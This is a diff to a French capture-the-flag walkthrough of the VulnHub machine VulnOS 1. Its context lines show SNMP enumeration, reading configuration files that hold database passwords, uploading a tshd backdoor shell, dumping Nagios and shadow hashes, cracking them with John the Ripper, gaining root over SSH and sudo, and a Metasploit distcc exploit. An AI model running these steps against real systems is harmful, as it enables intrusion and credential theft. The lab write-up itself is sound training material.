@@ -1,4 +1,7 @@
-# Solution du CTF VulnOS 1
+---
+title: "Solution du CTF VulnOS 1 de VulnHub"
+tags: [CTF,VulnHub]
+---
 
 Présentation
 ------------
@@ -148,7 +151,7 @@ Host script results:
 
 On se dit *"super, on va jouer un peu avec NFS !"* sauf que quand on appelle showmount il n'y a aucun partage exporté :'(  
 
-SNMP est quand à lui plus bavard. La chaine de communauté a été laissée à public. Le module snmp\_enum de Metasploit donne énormément d'informations notamment les processus qui tournent, l'espace disque sur les partitions, les interfaces réseau, ports en écoute ou connectés et les processus :  
+SNMP est quant à lui plus bavard. La chaine de communauté a été laissée à public. Le module snmp\_enum de Metasploit donne énormément d'informations notamment les processus qui tournent, l'espace disque sur les partitions, les interfaces réseau, ports en écoute ou connectés et les processus :  
 
 ```plain
 msf auxiliary(snmp_enum) > exploit
@@ -249,13 +252,13 @@ Il y a des mots de passe en clair dans shadow mais si on tente de se connecter, 
 
 Je décide de m'intéresser à la configuration d'Apache en lisant les fichiers de configurations (/etc/apache2/apache2.conf, /etc/apache2/sites-available/default) via la même faille.  
 
-Sur le second fichier on trouve le DocumentRoot (/var/www) et le ScriptAlias (qui pointe vers /usr/lib/cgi-bin/).  
+Sur le second fichier, on trouve le DocumentRoot (/var/www) et le ScriptAlias (qui pointe vers /usr/lib/cgi-bin/).  
 
 J'essaie de trouver le fichier de configuration de Drupal mais ce dernier ne semble pas installé au même endroit. Heureusement si on passe un fichier inexistant on a une erreur qui nous révèle son PATH : *The requested URL /usr/share/drupal6/index.php was not found on this server.*  
 
 Je peux accèder ainsi à /usr/share/drupal6/sites/default/dbconfig.php :  
 
-```plain
+```php
 $dbuser='drupal6';
 $dbpass='toor';
 $basepath='';
@@ -269,7 +272,7 @@ Bofbof...
 
 Qu'est-ce qu'il y a dans la config de dolibar (*/var/www/dolibarr-3.0.0/htdocs/conf/conf.php*) ?  
 
-```plain
+```php
 $dolibarr_main_db_host='0.0.0.0';
 $dolibarr_main_db_port='';
 $dolibarr_main_db_name='dolibarr';
@@ -292,18 +295,18 @@ Sur le blog Pentest du SANS j'ai trouvé [un article qui permet de résoudre ce 
 
 Un upload de tshd plus tard...  
 
-```plain
+```bash
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ uname -a
 Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux
 ```
 
-C'est bien joli mais ça ne nous donne pas un accès root. Le kernel 2.6.32 semble résister aux différents exploits que j'ai pu tester et les services qui tournent en root ne semblent pas plus vulnérables :(  
+C'est bien joli, mais ça ne nous donne pas un accès root. Le kernel 2.6.32 semble résister aux différents exploits que j'ai pu tester et les services qui tournent en root ne semblent pas plus vulnérables :(  
 
 J'ai donc continué à fouiller dans les fichiers via la faille webmin ou mon accès shell. Finalement j'ai repéré un pattern dans les mots de passe d'abord avec le password Nagios que j'ai pu casser :  
 
-```plain
+```bash
 $ cat /etc/nagios3/htpasswd.users
 nagiosadmin:8A86JOBWoCwnk
 
@@ -317,7 +320,7 @@ Puis via le contenu du fichier */etc/ldap.secret* : canuhackme
 
 J'ai créé une wordlist en me basant sur les noms d'utilisateurs récupérés + les mots de passe + des versions préfixées de canu et j'ai lancé JtR sur le fichier shadow :  
 
-```plain
+```bash
 $ /opt/jtr/john --wordlist=passwords.txt --rules shadow
 Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
 Use the "--format=crypt" option to force loading these as that type instead
@@ -328,7 +331,7 @@ guesses: 1  time: 0:00:00:00 DONE (Thu May 29 09:13:23 2014)  c/s: 175  trying: 
 
 On peut se connecter à SSH via cet account puis passer root via sudo car il est privilégié :  
 
-```plain
+```bash
 $ ssh vulnosadmin@192.168.1.29
 vulnosadmin@192.168.1.29's password: 
 Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux
@@ -364,7 +367,7 @@ Pwned
 Cadeau bonux
 ------------
 
-Alternativement il est possible d'exploiter le distcc (un serveur de compilation) présent sur le système :  
+Alternativement, il est possible d'exploiter le distcc (un serveur de compilation) présent sur le système :  
 
 ```plain
 msf exploit(distcc_exec) > show options
@@ -405,7 +408,7 @@ Le challenge offrait peu d'intérêt et se résume à l'exploitation de failles 
 
 L'auteur du CTF a visiblement installé le plus de services et de webapps possible en se disant que les participants parviendraient bien à se débrouiller avec ça...  
 
-Ainsi dans la racine web on trouvé les dossiers suivants :  
+Ainsi dans la racine web, on trouve les dossiers suivants :  
 
 ```plain
 dolibarr-3.0.0
